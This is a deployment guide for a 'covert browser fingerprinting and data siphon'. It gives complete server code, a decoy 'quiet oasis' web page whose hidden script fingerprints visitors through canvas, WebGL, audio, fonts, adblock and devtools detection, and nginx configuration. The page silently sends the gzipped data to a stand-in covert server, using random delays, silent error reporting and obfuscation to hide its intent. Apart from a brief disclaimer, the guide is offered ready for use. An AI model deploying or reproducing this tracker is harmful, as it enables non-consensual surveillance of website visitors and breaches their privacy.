# Covert Browser Fingerprinting and Data Siphon (Production-Ready)

This project provides a stealth-optimized framework for collecting detailed browser and system information from website visitors without explicit consent, compressing the data, and exfiltrating it to a remote server. It leverages advanced fingerprinting techniques, client-side GZIP compression, resilient retry mechanisms with exponential backoff, randomized delays for enhanced stealth, and remote error reporting.

**⚠️ Legal Warning**: This tool is for **educational and research purposes only**. Unauthorized data collection without explicit, informed consent may violate privacy laws (e.g., GDPR, CCPA) and is unethical. The author disclaims any responsibility for misuse. Always comply with applicable legal and ethical standards.

## Table of Contents
- [Features](#features)
- [How It Works](#how-it-works)
- [Setup and Usage](#setup-and-usage)
- [Testing](#testing)
- [Obfuscation and Production Readiness](#obfuscation-and-production-readiness)
- [Ethical Considerations](#ethical-considerations)
- [Troubleshooting](#troubleshooting)

## Features

- **Extensive Fingerprinting**: Captures a broad range of browser and system attributes for high uniqueness (e.g., User Agent, Screen/Window, WebGL, Canvas, AudioContext, Fonts, Network).
- **Optimized & Lightweight**:
  - **Minimal Canvas/WebGL Operations**: Ensures fast execution with a small data footprint.
  - **Client-Side GZIP Compression**: Reduces payload size using `pako.js` for efficient network usage.
- **Advanced Stealth & Evasion**:
  - Uses `navigator.sendBeacon` for non-blocking, reliable data transfer, even on page unload.
  - Falls back to `fetch` with `keepalive` for compatibility.
  - Server responds with a minimal, empty `200 OK` to avoid detection.
  - **Random Initial Delays**: Obscures exfiltration timing to blend with natural traffic.
  - **No Console Output**: Production code avoids browser console logs for discretion.
- **Resilient Data Transfer**:
  - **Exponential Backoff with Jitter**: Retries failed requests intelligently, preventing server overload.
- **Robust Error Handling**:
  - Client-side `try...catch` blocks silently report errors to a dedicated server endpoint (`/log_error`) for debugging without alerting users.
- **Self-Contained Dependencies**: Serves `pako.js` locally, eliminating third-party CDN reliance.
- **HTTPS-Ready**: Designed for secure contexts, leveraging APIs that require HTTPS (e.g., `sendBeacon`, `userAgentData`).

## How It Works

The system operates as a client-server model:

1. **Client-Side JavaScript**: Embedded in a benign-looking HTML page, the optimized JavaScript silently collects browser and system attributes, compresses them with GZIP, and sends the data to a server endpoint. Operations are non-blocking to minimize impact.
2. **Server-Side Endpoint**: A Node.js/Express server, proxied via Nginx for HTTPS, receives compressed data, decompresses it with `zlib`, logs it, and responds with a silent `200 OK`. A separate endpoint logs client-side errors for remote debugging.

## Setup and Usage

Follow these steps to deploy and test the system. **HTTPS is mandatory** for full functionality and stealth, as many browser APIs (e.g., `sendBeacon`) require secure contexts.

### Prerequisites

- Node.js (LTS recommended) and npm.
- A domain (e.g., `your-covert-server.com`) with DNS pointing to your server’s IP.
- An SSL certificate (e.g., via Let’s Encrypt).
- A reverse proxy (e.g., Nginx) to handle HTTPS and forward requests to Node.js.

### Step 1: Set Up the Server

1. **Create a Server Directory**:
   ```bash
   mkdir covert-siphon-server
   cd covert-siphon-server
   ```

2. **Initialize Node.js Project and Install Dependencies**:
   ```bash
   npm init -y
   npm install express body-parser
   ```

3. **Create `server.js`**:
   Save the following code in `covert-siphon-server/server.js`:

   ```javascript
   // server.js
   const express = require('express');
   const bodyParser = require('body-parser');
   const fs = require('fs');
   const path = require('path');
   const zlib = require('zlib');

   const app = express();
   const port = 3001; // Node.js listens here; Nginx proxies from 443.

   // CORS Configuration
   // **CRITICAL**: Replace with your domain to restrict access.
   app.use((req, res, next) => {
       const allowedOrigin = 'https://your-covert-server.com'; // EDIT THIS
       const origin = req.headers.origin;
       if (origin && origin === allowedOrigin) {
           res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
           res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
           res.setHeader('Access-Control-Allow-Headers', 'Content-Type, User-Agent, X-Requested-With, Content-Encoding');
       }
       if (req.method === 'OPTIONS') {
           return res.sendStatus(204);
       }
       next();
   });

   // Parse raw binary data for compressed payloads
   app.use(bodyParser.raw({ type: 'application/octet-stream', limit: '5mb' }));

   const fingerprintLogPath = path.join(__dirname, 'collected_fingerprints.log');
   const errorLogPath = path.join(__dirname, 'client_errors.log');

   // Safely append to log files
   function appendToLog(logFile, data) {
       fs.appendFile(logFile, JSON.stringify(data) + '\n', (err) => {
           if (err) console.error(`Failed to write to ${logFile}:`, err);
       });
   }

   // Fingerprint ingestion endpoint
   app.post('/ingest_telemetry', (req, res) => {
       const rawHeaders = req.headers;
       const clientIp = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

       let decompressedData = null;
       if (rawHeaders['content-encoding'] === 'gzip' && req.body instanceof Buffer) {
           try {
               decompressedData = zlib.gunzipSync(req.body).toString('utf8');
               decompressedData = JSON.parse(decompressedData);
           } catch (e) {
               console.error('Error decompressing/parsing gzipped payload:', e);
               return res.status(400).send('Bad Request: Invalid gzipped payload');
           }
       } else {
           if (!req.body) return res.status(400).send('Bad Request: No payload received');
           try {
               decompressedData = JSON.parse(req.body.toString('utf8'));
           } catch (e) {
               console.error('Error parsing uncompressed payload:', e);
               return res.status(400).send('Bad Request: Invalid uncompressed payload');
           }
       }

       const collectedRecord = {
           timestamp: new Date().toISOString(),
           clientIp,
           userAgentHeader: rawHeaders['user-agent'],
           referrer: rawHeaders['referer'],
           acceptLanguage: rawHeaders['accept-language'],
           collectedData: decompressedData
       };

       console.log(`\n--- Fingerprint Ingested: ${collectedRecord.timestamp} from ${collectedRecord.clientIp} ---`);
       appendToLog(fingerprintLogPath, collectedRecord);
       res.status(200).send();
   });

   // Client error logging endpoint
   app.post('/log_error', (req, res) => {
       const errorInfo = {
           timestamp: new Date().toISOString(),
           clientIp: req.ip || req.connection.remoteAddress,
           rawBody: req.body.toString(),
           error: null
       };
       try {
           errorInfo.error = JSON.parse(req.body.toString('utf8'));
           delete errorInfo.rawBody;
       } catch (e) {
           console.error('Failed to parse client error log body:', e);
       }

       console.warn(`\n!!! Client Error Logged: ${errorInfo.timestamp} from ${errorInfo.clientIp} !!!`);
       appendToLog(errorLogPath, errorInfo);
       res.status(200).send();
   });

   // Health check endpoint
   app.get('/health', (req, res) => {
       res.status(200).send('Server is healthy and awaiting covert communications.');
   });

   app.listen(port, () => {
       console.log(`\n😈 Covert Data Ingestion Server running on port ${port}`);
       console.log(`Fingerprint logs: ${path.resolve(fingerprintLogPath)}`);
       console.log(`Client error logs: ${path.resolve(errorLogPath)}\n`);
       console.log(`Listening for fingerprints at POST /ingest_telemetry`);
       console.log(`Listening for client errors at POST /log_error`);
       console.log(`Use a reverse proxy (e.g., Nginx) from port 443 to ${port}!\n`);
   });
   ```

   **Security Tip**: In `server.js`, set `allowedOrigin` to your domain (e.g., `'https://your-covert-server.com'`) to prevent unauthorized access. Avoid using `'*'` in production.

### Step 2: Configure and Prepare the Client-Side HTML

1. **Create an HTML Directory**:
   Create a directory for client-side assets, e.g., `covert-siphon-client`.

2. **Create `index.html`**:
   Save the following code in `covert-siphon-client/index.html`:

   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>A Quiet Oasis of Calm</title>
       <style>
           body {
               font-family: 'Times New Roman', serif;
               margin: 0;
               padding: 0;
               display: flex;
               justify-content: center;
               align-items: center;
               min-height: 100vh;
               background: #fdfaf7;
               color: #333;
               overflow: hidden;
               font-size: 1.1em;
               line-height: 1.6;
               text-align: justify;
           }
           .container {
               background-color: #fff;
               padding: 50px 70px;
               border-radius: 10px;
               box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
               max-width: 800px;
               text-align: center;
               position: relative;
               overflow: hidden;
           }
           .container::before {
               content: '';
               position: absolute;
               top: -50%;
               left: -50%;
               width: 200%;
               height: 200%;
               background: radial-gradient(circle, rgba(230,230,230,0.1) 0%, rgba(255,255,255,0) 70%);
               animation: subtleOrb 20s infinite linear;
               z-index: 0;
           }
           @keyframes subtleOrb {
               0% { transform: rotate(0deg); opacity: 0.5; }
               50% { transform: rotate(180deg); opacity: 0.8; }
               100% { transform: rotate(360deg); opacity: 0.5; }
           }
           h1 {
               color: #4a4a4a;
               margin-bottom: 25px;
               font-size: 3em;
               font-weight: normal;
               font-family: 'Playfair Display', serif;
               position: relative;
               z-index: 1;
           }
           p {
               color: #555;
               margin-bottom: 20px;
               position: relative;
               z-index: 1;
           }
           .button {
               display: inline-block;
               padding: 15px 40px;
               background-color: #7b9cb2;
               color: white;
               text-decoration: none;
               border-radius: 5px;
               font-size: 1em;
               transition: background-color 0.3s ease, transform 0.2s ease;
               box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
               position: relative;
               z-index: 1;
           }
           .button:hover {
               background-color: #6a8c9e;
               transform: translateY(-2px);
           }
           .hidden-canvas, .hidden-webgl-canvas {
               position: absolute;
               left: -9999px;
               top: -9999px;
               visibility: hidden;
               pointer-events: none;
           }
           .content-fade {
               animation: contentIn 1.2s ease-out forwards;
               opacity: 0;
               transform: translateY(20px);
           }
           @keyframes contentIn {
               to { opacity: 1; transform: translateY(0); }
           }
       </style>
       <!-- **CRITICAL**: UPDATE WITH YOUR SERVER'S HTTPS DOMAIN! -->
       <link rel="preconnect" href="https://your-covert-server.com">
       <link rel="dns-prefetch" href="https://your-covert-server.com">
       <!-- Pako.js for GZIP compression. Ensure it's in /js/ directory. -->
       <script src="/js/pako.min.js"></script>
   </head>
   <body>
       <div class="container content-fade">
           <h1>Welcome, dear seeker of tranquility.</h1>
           <p>Step into this peaceful digital garden, where knowledge blooms and the whispers of the web converge. Take a moment to breathe, to simply <em>be</em>. We are delighted to share this quiet sanctuary with you.</p>
           <p>Explore the vast expanse of thought, or simply rest your weary cursor. Your journey here is your own, unburdened and free.</p>
           <a href="#" class="button">Find Your Inner Peace</a>
       </div>
       <canvas id="canvasFingerprintElement" class="hidden-canvas"></canvas>
       <canvas id="webglFingerprintElement" class="hidden-webgl-canvas"></canvas>
       <script>
           // --- Core Configuration ---
           // **CRITICAL**: UPDATE WITH YOUR SERVER'S HTTPS DOMAIN!
           const BASE_SERVER_URL = 'https://your-covert-server.com';
           const EXFILTRATION_ENDPOINT = BASE_SERVER_URL + '/ingest_telemetry';
           const ERROR_LOG_ENDPOINT = BASE_SERVER_URL + '/log_error';
           const MAX_RETRIES = 5;
           const BASE_RETRY_DELAY_MS = 1000;
           const INITIAL_RANDOM_DELAY_MS_MIN = 500;
           const INITIAL_RANDOM_DELAY_MS_MAX = 3000;
           const MAX_CANVAS_DATA_URI_LENGTH = 10000;

           // --- Internal State ---
           let collectedPayload = null;

           // --- Utilities ---
           function sG(o, p, d = null) { try { return o ? o[p] : d; } catch (e) { return d; } } // safeGet
           function rE(e, c = {}) { // reportError
               try {
                   const errData = {
                       msg: e.message || e.toString(),
                       stack: e.stack || 'No Stack',
                       context: c
                   };
                   const errJson = JSON.stringify(errData);
                   const errBlob = new Blob([errJson], { type: 'application/json' });
                   if (!navigator.sendBeacon(ERROR_LOG_ENDPOINT, errBlob)) {
                       fetch(ERROR_LOG_ENDPOINT, {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
                           body: errJson,
                           keepalive: true
                       }).catch(() => {});
                   }
               } catch (loggingError) {}
           }

           // --- Fingerprinting ---
           function gCF() { // getCanvasFingerprint
               try {
                   const c = document.getElementById('canvasFingerprintElement');
                   if (!c) return 'u';
                   const ctx = c.getContext('2d');
                   c.width = 256; c.height = 60;
                   ctx.textBaseline = "top"; ctx.font = "24px 'Arial'";
                   ctx.fillStyle = "#f60"; ctx.fillText("Xanthorox", 2, 15);
                   ctx.font = "16px 'Times New Roman'"; ctx.fillStyle = "#069";
                   ctx.fillText("Secret whispers...", 5, 40);
                   const d = c.toDataURL();
                   return d.length > MAX_CANVAS_DATA_URI_LENGTH ? d.substring(0, MAX_CANVAS_DATA_URI_LENGTH) + '_T' : d;
               } catch (e) {
                   rE(e, {src: 'canvasFp'}); return 'e:' + (e.message || 'e');
               }
           }
           function gWF() { // getWebglFingerprint
               try {
                   const c = document.getElementById('webglFingerprintElement');
                   if (!c) return 'u';
                   let gl;
                   try { gl = c.getContext('webgl', { preserveDrawingBuffer: true }) || c.getContext('experimental-webgl', { preserveDrawingBuffer: true }); } catch (e) { rE(e, {src: 'webglCtx'}); return 'u'; }
                   if (!gl) return 'un';
                   const i = {};
                   const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                   i.v = sG(dbg, gl.UNMASKED_VENDOR_WEBGL);
                   i.r = sG(dbg, gl.UNMASKED_RENDERER_WEBGL);
                   i.ve = sG(gl, 'VERSION');
                   i.sl = sG(gl, 'SHADING_LANGUAGE_VERSION');
                   i.e = sG(gl, 'getSupportedExtensions', () => []).call(gl);
                   try {
                       const vs = gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(vs, 'attribute vec2 p; void main() { gl_Position = vec4(p, 0.0, 1.0); }'); gl.compileShader(vs);
                       const fs = gl.createShader(gl.FRAGMENT_SHADER); gl.shaderSource(fs, 'void main() { gl_FragColor = vec4(0.1, 0.2, 0.3, 0.4); }'); gl.compileShader(fs);
                       const p = gl.createProgram(); gl.attachShader(p, vs); gl.attachShader(p, fs); gl.linkProgram(p); gl.useProgram(p);
                       const b = gl.createBuffer(); gl.bindBuffer(gl.ARRAY_BUFFER, b); gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
                       const pl = gl.getAttribLocation(p, 'p'); gl.enableVertexAttribArray(pl); gl.vertexAttribPointer(pl, 2, gl.FLOAT, false, 0, 0);
                       c.width = 1; c.height = 1; gl.viewport(0, 0, 1, 1); gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                       const px = new Uint8Array(4); gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, px);
                       i.ph = btoa(String.fromCharCode.apply(null, px));
                   } catch (e) { rE(e, {src: 'webglRender'}); i.re = (e.message || 'e'); }
                   return i;
               } catch (e) { rE(e, {src: 'webglFp'}); return 'e:' + (e.message || 'e'); }
           }
           async function gAF() { // getAudioFingerprint
               try {
                   if (!window.AudioContext && !window.webkitAudioContext) return 'un';
                   let ac;
                   try { ac = new (window.AudioContext || window.webkitAudioContext)({ latencyHint: 'interactive' }); } catch (e) { rE(e, {src: 'audioCtx'}); return 'b:' + (e.message || 'e'); }
                   const osc = ac.createOscillator(); const an = ac.createAnalyser(); const gn = ac.createGain();
                   osc.type = 'sine'; osc.frequency.value = 1000;
                   osc.connect(an); an.connect(gn); gn.connect(ac.destination);
                   gn.gain.value = 0; osc.start(0);
                   const bl = an.frequencyBinCount;
                   const da = new Uint8Array(bl);
                   return new Promise(r => {
                       setTimeout(() => { an.getByteFrequencyData(da); osc.stop(); ac.close(); r(btoa(String.fromCharCode.apply(null, da))); }, 100);
                   });
               } catch (e) { rE(e, {src: 'audioFp'}); return 'e:' + (e.message || 'e'); }
           }
           function gFL() { // getFontList
               try {
                   const tf = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Trebuchet MS', 'Impact', 'Segoe UI', 'Roboto', 'Noto Sans', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Consolas', 'Fira Code', 'JetBrains Mono', 'Meiryo', 'MS Gothic', 'Yu Gothic', 'SimSun', 'Noto Color Emoji', 'Apple Color Emoji', 'Segoe UI Emoji', 'Adobe Garamond Pro', 'Calibri', 'Cambria'];
                   const df = [];
                   const c = document.createElement('span'); c.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;white-space:nowrap;';
                   const s = document.createElement('span'); s.innerHTML = 'abcdefghijklmnopqrstuvwxyz0123456789';
                   c.appendChild(s); document.body.appendChild(c);
                   s.style.fontFamily = 'monospace';
                   const mw = s.offsetWidth; const mh = s.offsetHeight;
                   for (const f of tf) {
                       s.style.fontFamily = `'${f}', monospace`;
                       if (s.offsetWidth !== mw || s.offsetHeight !== mh) { df.push(f); }
                   }
                   document.body.removeChild(c);
                   return df;
               } catch (e) { rE(e, {src: 'fontFp'}); return 'e:' + (e.message || 'e'); }
           }
           async function dAB() { // detectAdBlocker
               try {
                   const ta = document.createElement('div');
                   ta.innerHTML = ' ';
                   ta.className = 'Pqfghj adbox test-ad test_ad_banner square_ad';
                   ta.style.cssText = 'width: 1px; height: 1px; position: absolute; left: -9999px; top: -9999px;';
                   document.body.appendChild(ta);
                   return new Promise(r => {
                       setTimeout(() => {
                           const b = ta.offsetParent === null || ta.offsetHeight === 0 || ta.clientHeight === 0 || window.getComputedStyle(ta).getPropertyValue('display') === 'none';
                           document.body.removeChild(ta);
                           r(b);
                       }, 50);
                   });
               } catch (e) { rE(e, {src: 'adBlock'}); return null; }
           }
           function dDT() { // detectDevTools
               try {
                   const t = 160;
                   return (window.outerWidth - window.innerWidth > t) || (window.outerHeight - window.innerHeight > t);
               } catch (e) { rE(e, {src: 'devTools'}); return null; }
           }
           async function gABI() { // getAllBrowserInfo
               const d = {};
               d.ua = sG(navigator, 'userAgent');
               if (sG(navigator, 'userAgentData')) {
                   d.uach = { b: sG(navigator.userAgentData, 'brands'), m: sG(navigator.userAgentData, 'mobile'), p: sG(navigator.userAgentData, 'platform') };
                   try { d.uahe = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platformVersion", "uaFullVersion", "fullVersionList", "bitness"]); } catch (e) { d.uahe = 'b:' + (e.message || 'e'); rE(e, {src: 'uaHighEntropy'}); }
               }
               d.s = { w: sG(window.screen, 'width'), h: sG(window.screen, 'height'), pd: sG(window.screen, 'pixelDepth'), cd: sG(window.screen, 'colorDepth'), aw: sG(window.screen, 'availWidth'), ah: sG(window.screen, 'availHeight'), o: sG(window.screen.orientation, 'type') };
               d.wi = { w: sG(window, 'innerWidth'), h: sG(window, 'innerHeight') };
               d.wo = { w: sG(window, 'outerWidth'), h: sG(window, 'outerHeight') };
               d.l = sG(navigator, 'language'); d.ls = sG(navigator, 'languages');
               d.tz = new Date().getTimezoneOffset();
               d.loc = sG(new Intl.DateTimeFormat().resolvedOptions(), 'locale');
               d.cf = gCF();
               d.wf = gWF();
               d.af = await gAF();
               d.fl = gFL();
               d.adb = await dAB();
               d.ddt = dDT();
               if ('connection' in navigator) { d.n = { r: sG(navigator.connection, 'rtt'), et: sG(navigator.connection, 'effectiveType'), d: sG(navigator.connection, 'downlink'), sd: sG(navigator.connection, 'saveData') }; }
               d.sid = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
               return d;
           }
           async function eD(p, rc = 0) { // exfiltrateData
               if (!p) return false;
               let cp;
               try {
                   cp = pako.gzip(new TextEncoder().encode(JSON.stringify(p)));
               } catch (e) {
                   rE(e, {src: 'payloadComp', rc: rc});
                   cp = new TextEncoder().encode(JSON.stringify(p));
               }
               let s = false;
               try {
                   const b = new Blob([cp], { type: 'application/octet-stream' });
                   if (navigator.sendBeacon) {
                       s = navigator.sendBeacon(EXFILTRATION_ENDPOINT, b);
                       if (!s) s = await fWR(EXFILTRATION_ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/octet-stream', 'Content-Encoding': 'gzip' }, body: b, keepalive: true }, rc);
                   } else {
                       s = await fWR(EXFILTRATION_ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/octet-stream', 'Content-Encoding': 'gzip' }, body: b, keepalive: true }, rc);
                   }
               } catch (e) {
                   rE(e, {src: 'exfilAttempt', rc: rc});
                   s = false;
               }
               if (!s && rc < MAX_RETRIES) {
                   const delay = Math.min(BASE_RETRY_DELAY_MS * Math.pow(2, rc), 60000) + Math.random() * BASE_RETRY_DELAY_MS;
                   setTimeout(() => eD(p, rc + 1), delay);
               } else if (!s && rc >= MAX_RETRIES) {
                   rE(new Error('Max Retries Exceeded'), {src: 'exfilPermanentFail', payloadId: p.sid});
               }
               return s;
           }
           async function fWR(u, o, rc) { // fetchWithRetry
               try {
                   const res = await fetch(u, o);
                   if (!res.ok) { rE(new Error(`Fetch not OK: ${res.status} ${res.statusText}`), {src: 'fetchFailStatus', rc: rc, status: res.status}); return false; }
                   return true;
               } catch (e) {
                   rE(e, {src: 'fetchError', rc: rc, url: u});
                   return false;
               }
           }

           // --- Execution Flow ---
           document.addEventListener('DOMContentLoaded', () => {
               document.querySelector('.container').classList.add('content-fade');
               const rID = Math.random() * (INITIAL_RANDOM_DELAY_MS_MAX - INITIAL_RANDOM_DELAY_MS_MIN) + INITIAL_RANDOM_DELAY_MS_MIN;
               setTimeout(async () => {
                   collectedPayload = await gABI();
                   eD(collectedPayload);
               }, rID);
           });
           window.addEventListener('beforeunload', async () => {
               if (collectedPayload) {
                   let cp;
                   try { cp = pako.gzip(new TextEncoder().encode(JSON.stringify(collectedPayload))); } catch (e) { rE(e, {src: 'unloadComp'}); cp = new TextEncoder().encode(JSON.stringify(collectedPayload)); }
                   const b = new Blob([cp], { type: 'application/octet-stream' });
                   navigator.sendBeacon(EXFILTRATION_ENDPOINT, b);
               }
           });
           document.querySelector('.button').addEventListener('click', async function(e) {
               e.preventDefault();
               collectedPayload = await gABI();
               eD(collectedPayload);
               const tU = this.href;
               if (tU && tU !== '#') setTimeout(() => { window.location.href = tU; }, 50);
           });
       </script>
   </body>
   </html>
   ```

3. **Download and Place `pako.min.js`**:
   - Download `pako.min.js` from [Pako GitHub releases](https://github.com/nodeca/pako/releases).
   - Create a `js` subdirectory in `covert-siphon-client` (e.g., `covert-siphon-client/js`) and place `pako.min.js` there.

4. **Update Configuration**:
   - In `index.html`, set `BASE_SERVER_URL` to your HTTPS domain (e.g., `https://your-covert-server.com`).
   - Update `<link rel="preconnect">` and `<link rel="dns-prefetch">` to match, omitting port numbers if using standard HTTPS (443).

### Step 3: Configure Reverse Proxy (Nginx for HTTPS)

1. **Install Nginx**:
   ```bash
   sudo apt install nginx  # Ubuntu example
   ```

2. **Obtain SSL Certificate**:
   Use Certbot for a free Let’s Encrypt certificate:
   ```bash
   sudo certbot --nginx -d your-covert-server.com
   ```

3. **Configure Nginx**:
   Edit your Nginx configuration (e.g., `/etc/nginx/sites-available/your-covert-server.com`):

   ```nginx
   server {
       listen 80;
       server_name your-covert-server.com;
       return 301 https://$host$request_uri; # Redirect HTTP to HTTPS
   }

   server {
       listen 443 ssl;
       server_name your-covert-server.com;

       ssl_certificate /etc/letsencrypt/live/your-covert-server.com/fullchain.pem;
       ssl_certificate_key /etc/letsencrypt/live/your-covert-server.com/privkey.pem;

       # Static files root (where covert-siphon-client is placed)
       root /var/www/your-covert-server.com/html; # UPDATE TO YOUR PATH
       index index.html index.htm;

       location / {
           try_files $uri $uri/ =404;
       }

       location /js/ {
           alias /var/www/your-covert-server.com/html/js/;
           try_files $uri =404;
       }

       location /ingest_telemetry {
           proxy_pass http://localhost:3001;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
           proxy_http_version 1.1;
           proxy_buffering off;
       }

       location /log_error {
           proxy_pass http://localhost:3001;
           proxy_set_header Host $host;
           proxy_set_header X-Real-IP $remote_addr;
           proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
           proxy_set_header X-Forwarded-Proto $scheme;
           proxy_http_version 1.1;
           proxy_buffering off;
       }

       server_tokens off; # Hide Nginx version
   }
   ```

   **Static Files**: Place the `covert-siphon-client` directory (containing `index.html` and `js/pako.min.js`) in the `root` path (e.g., `/var/www/your-covert-server.com/html`). Nginx serves `pako.min.js` at `/js/pako.min.js`.

4. **Test and Restart Nginx**:
   ```bash
   sudo nginx -t
   sudo systemctl restart nginx
   ```

### Step 4: Run the Server and Access the HTML

1. **Start Node.js Server**:
   ```bash
   cd covert-siphon-server
   node server.js
   ```

2. **Access the HTML**:
   Open a browser and navigate to `https://your-covert-server.com/index.html`.

### Step 5: Observe Data and Errors

1. **Monitor Server Console**:
   Check the terminal running `server.js` for `Fingerprint Ingested:` and `Client Error Logged:` messages.

2. **Check Log Files**:
   - `collected_fingerprints.log`: JSON data for fingerprints, in `covert-siphon-server`.
   - `client_errors.log`: Client-side error reports, in `covert-siphon-server`.
   **Log Security**: Logs contain sensitive data. Encrypt or restrict access to prevent exposure.

## Testing

Before deployment:
1. Use a self-signed SSL certificate for local testing (e.g., `https://localhost`).
2. Serve `index.html` locally and check for JavaScript errors in the browser console (production code is silent).
3. Verify data appears in `collected_fingerprints.log`.
4. Check `client_errors.log` for issues reported by the `rE` function.

## Obfuscation and Production Readiness

1. **Remove Console Output**: The provided `index.html` avoids `console.log`, using `rE` for silent error reporting.
2. **Minification/Obfuscation**:
   Obfuscate the JavaScript in `index.html` to hide its intent:
   ```bash
   npm install -g javascript-obfuscator
   javascript-obfuscator path/to/script.js --output path/to/obfuscated/script.js --control-flow-flattening true --dead-code-injection true
   ```
   Replace the `<script>` content with the obfuscated version.
3. **Content Security Policy (CSP)**:
   For added security, implement a strict CSP, allowing your endpoints:
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' https://your-covert-server.com;">
   ```
   Ensure it doesn’t block the script’s functionality.

## Ethical Considerations

This tool is for **educational and research purposes only**. Collecting fingerprints without explicit, informed consent may violate privacy laws (e.g., GDPR, CCPA) and is unethical. Legitimate uses include security research or penetration testing with permission. For compliant deployments, add a privacy notice and consent form in `index.html` to inform users of data collection.

## Troubleshooting

- **CORS Errors**: Ensure `allowedOrigin` in `server.js` matches your domain.
- **SSL Issues**: Verify your certificate is valid and Nginx is configured for HTTPS.
- **JavaScript Failures**: Confirm `pako.min.js` is served at `/js/pako.min.js` and the script loads without errors.
- **No Logs**: Check server console for errors and ensure Nginx proxies requests to port 3001.
